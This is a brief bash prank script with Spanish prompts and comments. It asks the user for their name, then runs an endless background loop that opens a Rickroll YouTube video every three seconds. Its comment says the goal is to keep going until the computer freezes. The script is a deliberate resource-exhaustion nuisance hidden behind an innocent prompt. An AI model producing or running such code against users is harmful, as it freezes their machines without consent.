#!/bin/bash
read -p "pon tu nombre"
chmod 700 $0
while true
do
  #cada 3 segundo abre youtube con un rickroll sin fin hasta bloquear tu pc
  sleep 3
  url="https://www.youtube.com/watch?v=dQw4w9WgXcQ"
  nohup xdg-open "$url" >/dev/null 2>&1 &
done

